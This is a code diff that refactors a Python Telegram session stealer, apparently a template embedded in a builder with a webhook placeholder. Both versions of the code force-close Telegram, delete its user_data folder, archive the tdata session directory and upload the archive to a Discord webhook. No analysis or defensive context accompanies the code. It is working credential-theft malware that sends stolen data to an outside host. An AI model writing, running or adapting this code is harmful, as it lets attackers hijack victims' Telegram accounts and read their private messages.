@@ -26,41 +26,40 @@ for root, dirs, files in os.walk(search_pathC):
     if folder_name in dirs:
         found = True
         full_path = os.path.join(root, folder_name)
-#search folder
 
+home = os.path.expanduser('~')
 user = os.path.join(full_path) 
 hook = "{hook}"
-# sources end
+#search folder end
 
-#task_kill
-os.system('taskkill /f /im Telegram.exe')
-#task_kill_end
+def task_kill():
+    os.system('taskkill /f /im Telegram.exe')
 
-#delete no use files
-folder_path = os.path.join(user, 'user_data')
-time.sleep(2)
-if os.path.isdir(folder_path) == True:
-    shutil.rmtree(folder_path)
-#delete no use files end
+def delete_fold():
+    folder_path = os.path.join(user, 'user_data')
+    time.sleep(2)
+    if os.path.isdir(folder_path) == True:
+        shutil.rmtree(folder_path)
 
-# tdata take + archivation
-with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
-    for root, dirs, files in os.walk(user):
-        for file in files:
-            file_path = os.path.join(root, file)
-            archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
-# tdata take + archivation end
+def archivation():
+    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
+        for root, dirs, files in os.walk(user):
+            for file in files:
+                file_path = os.path.join(root, file)
+                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
 
-# discord send
 def discord_send():
     webhook = DiscordWebhook(url=hook)
-
     with open("tdata.zip", 'rb') as f:
         webhook.add_file(file=f.read(), filename='tdata_session.zip')
     webhook.execute()
 
-discord_send()
-# discord send end
+def main():
+    task_kill()
+    delete_fold()
+    archivation()
+    discord_send()
+main()
     """
 
 
